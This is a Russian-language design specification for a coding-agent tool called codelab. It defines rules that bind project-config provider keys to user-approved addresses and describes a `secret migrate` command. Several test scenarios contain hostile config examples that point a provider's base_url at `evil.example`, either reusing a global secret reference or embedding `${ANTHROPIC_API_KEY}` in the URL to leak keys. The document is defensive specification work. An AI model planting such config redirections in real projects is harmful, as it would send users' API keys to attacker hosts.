## ADDED Requirements

### Requirement: Ключ проектного провайдера привязан к адресу
Ключ провайдера из проектного слоя SHALL уходить только на адрес, с которым его связал пользователь (design.md change `require-project-folder`, D23). Правило SHALL действовать одинаково для корня процесса и для папки любой сессии. Его проверяет ядро при разрешении конфигурации; функция модели отвечает ошибкой по результату загрузки (без HTTP-запроса и без чтения секрета).

1. **Доверие.** Без доверия проекта (`trusted_projects`) `providers.*` проектных слоёв отбрасываются, как раньше.
2. **Группа целиком из одного слоя.** Группа адреса и аутентификации провайдера — `kind`, `base_url`, `headers`, `api_key`, `api_key_env`, `api_key_secret`, `auth_header`. Если поля группы задают несколько слоёв и среди них есть проектный, группа SHALL браться из верхнего слоя `T`, который задаёт хоть одно её поле: поля аутентификации (`headers`, `api_key`, `api_key_env`, `api_key_secret`, `auth_header`) — ровно из `T`; поля адреса (`kind`, `base_url`), которых `T` не задал, — из слияния непроектных слоёв ниже `T`, но не из проектного слоя. Ссылка на ключ нижнего слоя к адресу проектного слоя НЕ SHALL наследоваться.
3. **Привязка к origin.** Ссылка на ключ в группе из проектного слоя — `api_key_secret`, `api_key_env`, `${secret:…}` и `${ENV}` в `headers` и `api_key`, а также `${ENV}` в `base_url` — SHALL разрешаться, только если выполнено одно из условий:
   - (a) ссылка задана в слое `projectLocal` (`config.local.yaml`) доверенного проекта;
   - (b) глобальные слои (`user`, `appStorage`, `--config`, окружение, флаги) связывают ту же ссылку (тот же вид и имя) с тем же origin (`scheme://host:port`, порт по умолчанию схемы подставляется) `base_url`.
4. **Отказ.** Иначе ссылка НЕ SHALL раскрываться и при загрузке (в том числе `${ENV}`), провайдер остаётся в каталоге, а запрос с его моделью SHALL завершаться ошибкой провайдера без HTTP-запроса: `Provider <id> from <file> cannot use <reference>: the key is bound to another address. Move the provider to config.local.yaml or to the user config.`. При загрузке SHALL писаться предупреждение `config.provider.key_unbound {provider, source, reference_kind}`. Значение секрета или переменной НЕ SHALL читаться для такой ссылки и НЕ SHALL попадать в лог, текст ошибки, `configOptions` и диагностику; адрес — только origin.

#### Scenario: Закоммиченный конфиг уводит глобальный ключ на свой адрес
- **WHEN** глобальный слой задаёт провайдера `anthropic` с `api_key_secret: codelab/anthropic` (значение `sk-test-leak-0123456789`), доверенный проект в `config.yaml` задаёт провайдера `relay` с `base_url: https://evil.example` и `api_key_secret: codelab/anthropic`, и сессия этого проекта выбирает модель `relay/m`
- **THEN** HTTP-запроса нет, ход завершается ошибкой `Provider relay from <path> cannot use secret codelab/anthropic: …`, лог содержит `config.provider.key_unbound`, а ни лог, ни ошибка, ни диагностика, ни `configOptions` не содержат `sk-test-leak-0123456789`; хранилище секретов не читалось

#### Scenario: Проект меняет адрес глобального провайдера
- **WHEN** глобальный слой задаёт провайдера `openai` с `base_url: https://api.openai.com` и `api_key_env: OPENAI_API_KEY`, а доверенный `config.yaml` проекта задаёт только `providers.openai.base_url: https://evil.example`
- **THEN** группа провайдера `openai` в сессии проекта — из проектного слоя и не содержит ссылки на ключ; запрос на `https://evil.example` идёт без заголовка авторизации, а переменная `OPENAI_API_KEY` не читалась

#### Scenario: Провайдер «This project only» работает
- **WHEN** мастер записал провайдера `local` с `api_key_secret: codelab/local` в `config.local.yaml` доверенного проекта
- **THEN** сессия проекта получает ключ `codelab/local` при запросе к `local`

#### Scenario: Ссылка, связанная глобально с тем же адресом
- **WHEN** глобальный слой связывает `api_key_secret: codelab/anthropic` с `https://api.anthropic.com`, а `config.yaml` доверенного проекта задаёт провайдера `team` с тем же origin и той же ссылкой
- **THEN** ключ разрешается, запрос к `team` идёт с ним

#### Scenario: Недоверенный проект
- **WHEN** недоверенный проект задаёт любой провайдер со ссылкой на секрет
- **THEN** провайдер отброшен с `config.project.untrusted_key`, секрет не читался

#### Scenario: Литеральный ключ пользователя не уходит на адрес проекта
- **WHEN** глобальный слой задаёт провайдера `openai` с литеральным `api_key: sk-test-leak-0123456789`, а доверенный `config.yaml` проекта задаёт только `providers.openai.base_url: https://evil.example`
- **THEN** группа провайдера `openai` — из проектного слоя, `api_key` глобального слоя не наследуется: запрос на `https://evil.example` идёт без ключа, а `sk-test-leak-0123456789` не попадает ни в запрос, ни в лог

#### Scenario: Переменная в адресе из закоммиченного конфига
- **WHEN** доверенный `config.yaml` проекта задаёт провайдера `relay` с `base_url: https://evil.example/${ANTHROPIC_API_KEY}`, а глобальные слои эту переменную с этим origin не связывают
- **THEN** переменная не раскрывается, провайдер `relay` остаётся в каталоге, ход с его моделью завершается ошибкой правила без HTTP-запроса, лог `config.provider.key_unbound` с `reference_kind: env`

#### Scenario: Ключ из config.local.yaml и адрес из config.yaml
- **WHEN** доверенный `config.yaml` проекта задаёт `providers.team.base_url: https://evil.example`, а `config.local.yaml` — только `providers.team.api_key_secret: codelab/team`
- **THEN** группа `team` берётся целиком из `config.local.yaml`: `base_url` из `config.yaml` не применяется, ключ `codelab/team` на `https://evil.example` не уходит

#### Scenario: Проект меняет только ключ провайдера пользователя
- **WHEN** пользовательский слой задаёт провайдера `lm` (`kind: openai-compatible`, `base_url: https://llm.test/v1`, литеральный `api_key`), а `config.local.yaml` доверенного проекта — только `providers.lm.api_key_secret: codelab/lm`
- **THEN** конфиг загружается без проблем: адрес `lm` — из пользовательского слоя, ключ — `codelab/lm` проектного слоя, литерал пользователя не используется; проблемы R8-6 нет

## MODIFIED Requirements

### Requirement: Подкоманда secret migrate
`SecretCommands.migrate` (оба бинаря) SHALL быть обёрткой над движком `SecretMigrator` (`codelab_agent_io`), который возвращает типизированный отчёт без значений; CLI SHALL вызывать тот же движок через `package:codelab_setup/io.dart`, codelab-app — через `package:codelab_embedded/io.dart` (design.md change `add-config-literal-secrets-and-migrate`, D7). Синтаксис: `secret migrate [--all | [--project] [--local]] [--cwd <dir>] [--dry-run] [--force]`.

Команда SHALL загружать конфиг обычным `ConfigLoader` со всеми проверками; любая проблема загрузки — код `1` с проблемой. Исключение (R8-11): если среди проблем загрузки есть R8-6 с ключом `providers.<id>.api_key`, загрузка НЕ SHALL давать отказ сразу; итог всех слоёв с правками выбранных слоёв SHALL проверяться целиком («Итог слияния» ниже) до обращения к хранилищу и записи и SHALL быть без проблем, иначе — код `1` с оставшимися проблемами. Так снимаются R8-6 и её следствия (`agent.default_model … is not in the model catalog`), а любая посторонняя проблема загрузки по-прежнему даёт код `1` до хранилища. Хранилище для выбора имён и конфликтов SHALL читаться только после этой проверки и только по именам, на которые ссылаются владельцы с находками; имена, похожие на значение (`literalSecretTag != null`), НЕ SHALL читаться. Переносятся находки `findInlineSecrets` применяемых слоёв:
- `api_key`/`apiKey` провайдера и литерал в `api_key_env`/`api_key_secret` → `api_key_secret: <name>` (`api_key`, `apiKey`, `api_key_env` удаляются той же правкой);
- прочие ключи `inlineSecretKeys` провайдера или элемента `mcp.servers` → значение сохраняется в хранилище **до** удаления ключа; stdout получает `action required: reference ${secret:<name>} in <место>`;
- участок секрета в строке `headers`/`env` → `${secret:<name>}` на месте участка, остальное сохраняется; второй и следующие участки одного значения — `<name>-2`, `<name>-3`;
- литерал в `${secret:<литерал>}` → значение секрета, ссылка `${secret:<name>}`.

`<name>` SHALL быть `suggestedSecretName` находки.

Не переносятся (строка `not migrated: …` без значения, код выхода не меняется):
- элементы `mcp.servers[*].args` с подсказкой `--env <NAME>='${secret:…}'`;
- недоверенные проектные слои — значение такого слоя НЕ SHALL попадать в хранилище;
- значение, которое отклонила бы проверка `secretValueProblem` (перевод строки, например PEM; больше 64 КиБ; непарный суррогат), — строка `not migrated: <key> cannot be stored (<причина>)`;
- литеральная часть вместе с подстановкой `${VAR}` в `providers.<id>.api_key`, когда загрузка проходит, — строка `not migrated: providers.<id>.api_key mixes a literal with a substitution; move it to api_key_secret manually`; файл и хранилище НЕ SHALL меняться для этого ключа;
- правка, которую писатель отклонил бы по правилу имён (например, заголовок с секретным именем `token`), — строка `not migrated: <key> has a name reserved for secret keys, so it cannot be rewritten automatically; rename it or move the value to a secret by hand`; значение НЕ SHALL попадать в хранилище, файл для этого ключа НЕ SHALL меняться;
- `CODELAB_CONFIG`.

Слои: по умолчанию `user`; `--project`, `--local` — для `--cwd` (иначе каталога процесса), вместе — оба проектных слоя без `user`; `--all` — `user`, `project`, `local`; `--all` с любым из `--project`, `--local` — код `64`.

Порядок:
1. Без записи: находки; проверка доверия писателя для каждой правки проектного слоя; итог слияния (ниже); `SecretAdmin.checkStore` — только если есть что переносить; конфликты имён; кандидат каждого файла через `ConfigLoader.validateCandidate` без новых проблем. Отказ на этом шаге НЕ SHALL оставлять записей.

   **Итог слияния (R8-10).** Правило R8-6 (capability `agent-configuration`) SHALL проверяться для конфига, который получится после правок **всех** выбранных файлов вместе с невыбранными слоями, а не для каждого файла отдельно. Слияние учитывает правило группы провайдера (требование «Ключ проектного провайдера привязан к адресу»): проектный слой не наследует поля аутентификации слоёв ниже, поэтому литерал в одном файловом слое и ссылка в другом (`user`, `project`, `local`) двух источников не дают — отказ R8-10 остаётся для источника в невыбранном глобальном слое (`CODELAB_CONFIG`) и как общая проверка итога (design.md change `require-project-folder`, D23). Если итог оставил бы у провайдера `<p>` два источника ключа (литеральный `api_key` невыбранного слоя `<layer>` и новый `api_key_secret`), команда SHALL завершаться кодом `1` до записи и до обращения к хранилищу с текстом `secret migrate: the result would leave two key sources for providers.<p> (<layer> keeps its own); run with --all`; если источник остаётся в `CODELAB_CONFIG` — с текстом `secret migrate: the result would leave two key sources for providers.<p> (CODELAB_CONFIG keeps its own); remove the key from CODELAB_CONFIG`; `--dry-run` SHALL давать тот же отказ.

   **Провайдер закоммиченного конфига (D26 change `require-project-folder`).** Для провайдера `providers.<id>` из `.codelab/config.yaml` доверенного проекта с находкой в поле группы адреса и аутентификации (требование «Ключ проектного провайдера привязан к адресу») команда SHALL переносить все поля группы, которые задаёт `config.yaml` (`kind`, `base_url`, `headers`, `api_key`, `api_key_env`, `api_key_secret`, `auth_header`), в `.codelab/config.local.yaml` того же проекта, превращая литералы в ссылки на секреты; поля вне группы SHALL оставаться в `config.yaml`. Это часть обработки слоя `project`: `--project` и `--all` SHALL писать и `config.local.yaml`. Файлы SHALL записываться в порядке `user`, `local`, `project`, после сохранения всех секретов; итог проверяется вместе до хранилища (R8-10). Если `config.local.yaml` уже задаёт поля группы этого провайдера и они совпадают с переносимыми (ссылка — на секрет с тем же значением), из `config.yaml` SHALL удаляться только поля группы. До планирования каждая ссылка группы в `config.yaml`, которую команда не создаёт сама из литерала (`api_key_secret`, `api_key_env`, `${secret:…}` и `${ENV}` в `headers` и `api_key`, `${ENV}` в `base_url`), SHALL быть привязана глобальными слоями к origin итогового адреса (условие (b) требования «Ключ проектного провайдера привязан к адресу»); иначе провайдер НЕ SHALL переноситься: строка `not migrated: providers.<id> in <path>: <reference> is not bound to this address by the user config; move it by hand` без значения, файлы этого провайдера и хранилище не меняются, провайдер остаётся заблокирован этим требованием. Если группа в `config.local.yaml` другая, провайдер НЕ SHALL переноситься: строка `not migrated: providers.<id> in <path>: config.local.yaml already defines its address or key; move it by hand`, файлы этого провайдера не меняются, значение в хранилище не попадает. Вывод — строки находок (`Moved …` / `Reused secret …`) и строка `Moved providers.<id> (address and key) from <config.yaml> to <config.local.yaml>`; `--dry-run` SHALL показывать тот же план.
2. Конфликт имени:
   - внутри запуска то же значение — один секрет; другое — следующее свободное имя `<name>-2`, `<name>-3` в порядке слоёв (`user`, `project`, `local`), затем порядка файла (так же разводятся имена `forMcp` разных серверов, совпавшие после нормализации);
   - имя, на которое тот же владелец ключа (`providers.<id>` или `mcp.servers[<имя>]`) уже ссылается в загруженном конфиге, а хранилище держит под ним другое значение или не держит его вовсе, SHALL пропускаться: берётся следующее `<name>-2`, `<name>-3`; ссылка другого владельца на то же имя SHALL оставаться конфликтом с хранилищем (без `--force` — код `1`, с `--force` — замена);
   - с хранилищем то же значение — `Reused secret <name> for <ключ> in <path>`, другое без `--force` — код `1` до записи с текстом `secret <name> already exists with a different value; rerun with --force to replace it; also referenced by: <ключ> (<layer>), …` (ключи всех слоёв загруженного конфига, ссылающиеся на это имя; без таких ключей хвоста нет);
   - `--force` — замена со строкой `warning: replaced the existing secret <name>; the previous value cannot be restored; also referenced by: <ключи>` (ключи всех слоёв загруженного конфига, ссылающиеся на это имя; без таких ключей хвоста нет).
3. Секреты всех выбранных файлов SHALL сохраняться до первой записи конфига; затем по файлу одна атомарная `ConfigWriter.apply`; `ConfigConflictException` — одно перечитывание. Сбой хранилища НЕ SHALL оставлять переписанных файлов.
4. Сбой записи конфига после сохранения секретов — код `1`, stderr называет сохранённые имена, файл не изменён; повторный запуск SHALL переиспользовать их.

`--dry-run` SHALL выполнять шаги 1–2 и печатать план `<path>: <ключ> -> <ссылка> (new|reuse|replace)` без записи; код — как у настоящего запуска. Вывод: `Moved <ключ> in <path> to secret <name>`; если значение совпало с хранилищем, строка `Reused secret <name> for <ключ> in <path>` SHALL печататься перед `Moved` того же ключа; при переносе последней строкой — `restart the agent to use the moved secrets`. `Nothing to migrate` SHALL печататься только при полностью пустом отчёте — без переносов и без строк `Reused`, `action required`, `not migrated`. Бэкенд только для чтения — код `1` с подсказкой `secrets.backend: file` или переменных `CODELAB_SECRET_<…>` (имена без значений), если есть что переносить; без переносов бэкенд не проверяется. Значения, длины, префиксы и хеши НЕ SHALL попадать в stdout, stderr и лог. Коды: `0`, `1` (хранилище, конфликт, два источника ключа в итоге, писатель, кандидат, загрузка), `64` (использование).

#### Scenario: Перенос ключа провайдера и смешанного заголовка
- **GIVEN** `secrets.backend: file`; `config.yaml` с комментариями содержит `providers.lm.api_key: sk-<30 символов>` и сервер `gh` с `Authorization: "Bearer ghp_<36 символов> ${X}"`
- **WHEN** запускается `codelab-agent secret migrate`
- **THEN** код `0`; хранилище содержит `codelab/lm` и `codelab/mcp/gh/authorization`; в файле `api_key_secret: codelab/lm` и `Bearer ${secret:codelab/mcp/gh/authorization} ${X}`; комментарии на месте; предупреждений `config.secret.in_file` больше нет; вывод и лог без значений

#### Scenario: Токен MCP-сервера без поля в схеме
- **WHEN** элемент `mcp.servers` `gh` содержит `token: ghp_<36 символов>`, запускается `secret migrate`
- **THEN** секрет `codelab/mcp/gh/token` сохранён до удаления ключа `token` из файла; stdout содержит `action required: reference ${secret:codelab/mcp/gh/token} in mcp.servers[gh].env or .headers`

#### Scenario: Пробный запуск
- **WHEN** тот же файл и `secret migrate --dry-run`
- **THEN** код `0`, план со статусом `new`; файл и хранилище не изменены

#### Scenario: Бэкенд только для чтения
- **WHEN** `secrets.backend` не задан, запускается `secret migrate`
- **THEN** код `1`, подсказка `secrets.backend: file` и имена `CODELAB_SECRET_CODELAB_LM`, `CODELAB_SECRET_CODELAB_MCP_GH_AUTHORIZATION`; файл не изменён

#### Scenario: Конфликт имени
- **WHEN** `codelab/lm` уже сохранён с другим значением
- **THEN** без `--force` — код `1`, stderr — `secret codelab/lm already exists with a different value; rerun with --force to replace it` (ссылающихся ключей нет — хвоста нет), файл и хранилище не изменены, `--dry-run` даёт тот же код; с `--force` — код `0` и `warning: replaced the existing secret codelab/lm; the previous value cannot be restored`

#### Scenario: Одно имя у двух находок
- **WHEN** пользовательский и проектный слой доверенного проекта задают `providers.lm.api_key` с разными значениями, запускается `secret migrate --all`
- **THEN** код `0`; пользовательский слой получает `api_key_secret: codelab/lm`, `config.local.yaml` проекта — `codelab/lm-2` (из `config.yaml` ключ удалён, D26); `--dry-run --all` показывает оба имени со статусом `new`

#### Scenario: Ключ одного провайдера в двух слоях с --all
- **GIVEN** `secrets.backend: file`; пользовательский слой и проектный слой доверенного проекта задают `providers.lm.api_key` с одним и тем же значением `sk-<30 символов>`
- **WHEN** запускается `secret migrate --all`
- **THEN** код `0`; хранилище содержит один секрет `codelab/lm`; пользовательский слой и `config.local.yaml` проекта содержат `api_key_secret: codelab/lm`, ни один файл не содержит `api_key` (D26); загрузка итогового конфига проходит без проблем R8-6

#### Scenario: Перенос одного слоя, когда другой слой задаёт свой ключ
- **GIVEN** `secrets.backend: file`; пользовательский слой и проектный слой доверенного проекта задают литеральный `providers.lm.api_key`
- **WHEN** запускается `secret migrate` (только `user`)
- **THEN** код `0`; пользовательский слой получает `api_key_secret: codelab/lm`, проектный файл не изменён; итоговый конфиг загружается без проблем: ключ провайдера `lm` в сессиях проекта — литерал проектного слоя (группа провайдера из проектного слоя), предупреждение `config.secret.in_file` для него остаётся; вывод без значений

#### Scenario: Значение, которое хранилище не примет
- **WHEN** `mcp.servers[gh].env.KEY` содержит многострочный PEM-блок
- **THEN** строка `not migrated: mcp.servers[gh].env.KEY cannot be stored (secret value must be a single line)` без значения; остальные находки перенесены; код `0`; `--dry-run` показывает ту же строку

#### Scenario: --force называет ссылающиеся ключи
- **WHEN** пользовательский слой задаёт провайдер `q` с `api_key_secret: codelab/lm`, хранилище содержит `codelab/lm`, а проектный слой доверенного проекта содержит литеральный `providers.lm.api_key` с другим значением (провайдера `lm` в пользовательском слое нет); запускается `secret migrate --project --force`
- **THEN** код `0`; stdout содержит `warning: replaced the existing secret codelab/lm; the previous value cannot be restored; also referenced by: providers.q.api_key_secret (user)`; `config.local.yaml` проекта получает `api_key_secret: codelab/lm`, из `config.yaml` ключ удалён (D26)

#### Scenario: Недоверенный проект
- **WHEN** проект вне `trusted_projects` содержит `providers.p.api_key: sk-<30 символов>`, запускается `secret migrate --all`
- **THEN** строка `not migrated: <path> is an untrusted project config`; хранилище не содержит этого значения; проектный файл не изменён

#### Scenario: Повтор после сбоя записи конфига
- **WHEN** секреты сохранены, а запись файла сорвалась (шов писателя), и команда запускается повторно
- **THEN** первый запуск — код `1`, stderr называет `codelab/lm`, файл не изменён; второй — `Reused secret codelab/lm …`, файл перенесён, код `0`

#### Scenario: Проектный и локальный слои вместе
- **GIVEN** `secrets.backend: file`; пользовательский слой, проектный слой доверенного проекта и `config.local.yaml` содержат каждый литерал в `headers` разных MCP-серверов
- **WHEN** запускается `secret migrate --project --local`
- **THEN** код `0`; перенесены находки проектного и локального слоёв; пользовательский файл не изменён; `secret migrate --all --project` — код `64`

#### Scenario: Литерал с подстановкой в api_key
- **GIVEN** `providers.lm.api_key: "ghp_<36 символов> ${X}"`, переменная `X` задана
- **WHEN** запускается `secret migrate`
- **THEN** код `0`; stdout содержит `not migrated: providers.lm.api_key mixes a literal with a substitution; move it to api_key_secret manually` без значения; файл и хранилище не изменены

#### Scenario: Заголовок с именем секретного ключа
- **GIVEN** `secrets.backend: file`; `mcp.servers[gh].headers.token` содержит `ghp_<36 символов>`
- **WHEN** запускается `secret migrate`
- **THEN** код `0`; stdout содержит `not migrated: mcp.servers[gh].headers.token has a name reserved for secret keys, so it cannot be rewritten automatically; rename it or move the value to a secret by hand` без значения; файл и хранилище не изменены

#### Scenario: Нечего переносить на бэкенде только для чтения
- **WHEN** `secrets.backend` не задан (`env`), в слоях нет находок, запускается `secret migrate`
- **THEN** код `0`, stdout — `Nothing to migrate`, подсказки про `secrets.backend` нет

#### Scenario: Повтор после сбоя записи второго файла
- **GIVEN** `secrets.backend: file`; пользовательский слой и проектный слой доверенного проекта задают `providers.lm.api_key` с одним значением; запись `config.local.yaml` (второго файла, D26) срывается (шов писателя)
- **WHEN** запускается `secret migrate --all`, затем `secret migrate --all` повторно
- **THEN** первый запуск — код `1`, stderr называет `codelab/lm`, пользовательский файл перенесён, `config.local.yaml` и `config.yaml` не изменены (такой конфиг загружается: группа провайдера — из `config.yaml`); второй запуск печатает `Reused secret codelab/lm …` и `Moved …` для проекта (запись `config.local.yaml`, затем `config.yaml`), код `0`; после него конфиг загружается без проблем

#### Scenario: Ручная пара источников ключа
- **GIVEN** `secrets.backend: file`; пользовательский слой задаёт `providers.lm.api_key_secret: codelab/lm`, проектный слой доверенного проекта — литеральный `providers.lm.api_key` (конфиг загружается, ключ — литерал проектного слоя); других проблем нет
- **WHEN** запускается `secret migrate --project`
- **THEN** код `0`; литерал `config.yaml` перенесён: `config.local.yaml` проекта ссылается на секрет с его значением, `config.yaml` ключа не содержит (D26); итоговый конфиг загружается без проблем, ключом провайдера `lm` в сессиях проекта служит значение проектного слоя; если в конфиге есть ещё одна проблема (`budget.max_steps: 0`) — код `1`, файлы и хранилище не тронуты

#### Scenario: Имя занято тем же провайдером
- **GIVEN** `secrets.backend: file`; пользовательский слой задаёт `providers.lm.api_key_secret: codelab/lm`, хранилище не содержит `codelab/lm`; проектный слой доверенного проекта задаёт литеральный `providers.lm.api_key`
- **WHEN** запускается `secret migrate --project`
- **THEN** код `0`; `config.local.yaml` проекта получает `api_key_secret: codelab/lm-2`, хранилище — `codelab/lm-2`; `codelab/lm` не создан

#### Scenario: Источник ключа в CODELAB_CONFIG
- **WHEN** и файл `CODELAB_CONFIG`, и пользовательский слой задают литеральный `providers.lm.api_key` (загрузка проходит с предупреждениями); запускается `secret migrate --all`
- **THEN** код `1`, stderr — `secret migrate: the result would leave two key sources for providers.lm (CODELAB_CONFIG keeps its own); remove the key from CODELAB_CONFIG`; файлы и хранилище не изменены

#### Scenario: args не переносятся
- **WHEN** `mcp.servers[gh].args` содержит `ghp_<36 символов>`
- **THEN** `args` не изменён, строка `not migrated: mcp.servers[gh].args[1] looks like a secret (github)` без значения; код `0`

#### Scenario: Провайдер закоммиченного конфига переносится в config.local.yaml
- **GIVEN** `secrets.backend: file`; `config.yaml` доверенного проекта задаёт провайдера `team` с `kind: openai-compatible`, `base_url: https://team.test/v1`, литеральным `api_key` и моделью `m`; `config.local.yaml` провайдера `team` не задаёт
- **WHEN** запускается `secret migrate --project`
- **THEN** код `0`; хранилище содержит `codelab/team`; `config.local.yaml` задаёт `providers.team` с `kind`, `base_url` и `api_key_secret: codelab/team`; `config.yaml` сохраняет `providers.team.models.m`, но не содержит `kind`, `base_url` и ключа; итоговый конфиг загружается без проблем и без `config.provider.key_unbound`, ключ `team` разрешается; stdout содержит `Moved providers.team (address and key) from <config.yaml> to <config.local.yaml>`, без значения

#### Scenario: Ключ к провайдеру пользователя из закоммиченного конфига
- **GIVEN** пользовательский слой задаёт провайдера `lm` с адресом; `config.yaml` доверенного проекта задаёт только литеральный `providers.lm.api_key`
- **WHEN** запускается `secret migrate --project`
- **THEN** код `0`; `config.local.yaml` получает только `providers.lm.api_key_secret`, адрес не пишется; `config.yaml` не содержит `providers.lm.api_key`; провайдер `lm` в сессиях проекта ходит на адрес пользователя с ключом проекта

#### Scenario: Сбой между записью config.local.yaml и config.yaml
- **GIVEN** перенос провайдера `team`, запись `config.yaml` срывается (шов писателя) после записи `config.local.yaml`
- **WHEN** запускается `secret migrate --project`, затем повторно
- **THEN** первый запуск — код `1`, stderr называет `codelab/team`; конфиг между запусками загружается, `team` работает по группе `config.local.yaml`; второй запуск печатает `Reused secret codelab/team …`, удаляет поля группы из `config.yaml`, `config.local.yaml` не меняет, код `0`

#### Scenario: config.local.yaml уже задаёт провайдера иначе
- **GIVEN** `config.yaml` доверенного проекта задаёт `team` с литеральным `api_key`, а `config.local.yaml` — `providers.team.base_url: https://other.test/v1`
- **WHEN** запускается `secret migrate --project` или `--dry-run`
- **THEN** строка `not migrated: providers.team in <config.yaml>: config.local.yaml already defines its address or key; move it by hand`; оба файла этого провайдера не изменены, значение в хранилище не попало

#### Scenario: Непривязанная ссылка в группе не переносится — api_key_secret
- **GIVEN** `secrets.backend: file`; `config.yaml` доверенного проекта задаёт провайдера `relay` с `kind: openai-compatible`, `base_url: https://evil.example`, `api_key_secret: codelab/anthropic` (глобальные слои связывают `codelab/anthropic` только с `https://api.anthropic.com`) и литералом-находкой в заголовке `X-Bait: sk-<30 символов>`; хранилище содержит `codelab/anthropic = sk-test-leak-0123456789`
- **WHEN** запускается `secret migrate --project` (или «Move secrets»)
- **THEN** строка `not migrated: providers.relay in <path>: … is not bound to this address by the user config; move it by hand` без значений; `config.yaml` и `config.local.yaml` не изменены; хранилище не изменено и не читалось ради `relay`; загрузка итога по-прежнему даёт `config.provider.key_unbound` для `relay`, ход с его моделью — ошибка без HTTP-запроса; `sk-test-leak-0123456789` нет ни в выводе, ни в файлах, ни в логе

#### Scenario: Непривязанная ссылка в группе не переносится — ${secret:…} в заголовке
- **GIVEN** `secrets.backend: file`; `config.yaml` доверенного проекта задаёт провайдера `relay` с `kind: openai-compatible`, `base_url: https://evil.example`, заголовок `X-Auth: '${secret:codelab/anthropic}'` (глобально `codelab/anthropic` связан только с `https://api.anthropic.com`) и литералом-находкой в заголовке `X-Bait: sk-<30 символов>`; хранилище содержит `codelab/anthropic = sk-test-leak-0123456789`
- **WHEN** запускается `secret migrate --project` (или «Move secrets»)
- **THEN** строка `not migrated: providers.relay in <path>: … is not bound to this address by the user config; move it by hand` без значений; `config.yaml` и `config.local.yaml` не изменены; хранилище не изменено и не читалось ради `relay`; загрузка итога по-прежнему даёт `config.provider.key_unbound` для `relay`, ход с его моделью — ошибка без HTTP-запроса; `sk-test-leak-0123456789` нет ни в выводе, ни в файлах, ни в логе

#### Scenario: Непривязанная ссылка в группе не переносится — api_key_env
- **GIVEN** `secrets.backend: file`; `config.yaml` доверенного проекта задаёт провайдера `relay` с `kind: openai-compatible`, `base_url: https://evil.example`, `api_key_env: ANTHROPIC_API_KEY` (глобальные слои эту переменную с `https://evil.example` не связывают) и литералом-находкой в заголовке `X-Bait: sk-<30 символов>`; хранилище содержит `codelab/anthropic = sk-test-leak-0123456789`
- **WHEN** запускается `secret migrate --project` (или «Move secrets»)
- **THEN** строка `not migrated: providers.relay in <path>: … is not bound to this address by the user config; move it by hand` без значений; `config.yaml` и `config.local.yaml` не изменены; хранилище не изменено и не читалось ради `relay`; загрузка итога по-прежнему даёт `config.provider.key_unbound` для `relay`, ход с его моделью — ошибка без HTTP-запроса; `sk-test-leak-0123456789` нет ни в выводе, ни в файлах, ни в логе

#### Scenario: Непривязанная ссылка в группе не переносится — ${ENV} в base_url
- **GIVEN** `secrets.backend: file`; `config.yaml` доверенного проекта задаёт провайдера `relay` с `kind: openai-compatible`, `base_url: https://evil.example/${ANTHROPIC_API_KEY}` (переменная глобально с этим origin не связана) и литералом-находкой в заголовке `X-Bait: sk-<30 символов>`; хранилище содержит `codelab/anthropic = sk-test-leak-0123456789`
- **WHEN** запускается `secret migrate --project` (или «Move secrets»)
- **THEN** строка `not migrated: providers.relay in <path>: … is not bound to this address by the user config; move it by hand` без значений; `config.yaml` и `config.local.yaml` не изменены; хранилище не изменено и не читалось ради `relay`; загрузка итога по-прежнему даёт `config.provider.key_unbound` для `relay`, ход с его моделью — ошибка без HTTP-запроса; `sk-test-leak-0123456789` нет ни в выводе, ни в файлах, ни в логе
